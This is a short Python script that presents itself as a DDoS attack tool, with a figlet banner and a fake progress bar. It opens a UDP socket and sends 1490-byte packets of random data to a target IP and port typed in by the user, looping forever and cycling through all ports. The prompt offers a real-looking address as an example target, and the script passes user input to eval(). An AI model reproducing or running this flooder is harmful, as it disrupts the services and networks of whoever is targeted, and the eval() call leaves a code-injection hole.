from __future__ import absolute_import
from __future__ import print_function
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
from six.moves import input
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print()

print("""
    _         _                 _    _        
   /_\  _ __ (_)_ _  ___ ___ __| |__| |___ ___
  / _ \| '  \| | ' \/ _ \___/ _` / _` / _ (_-<
 /_/ \_\_|_|_|_|_||_\___/   \__,_\__,_\___/__/
                                                """)
                                                              
                                                             
print()
ip = input("IP Target(35.163.98.108)  : ")
port = eval(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

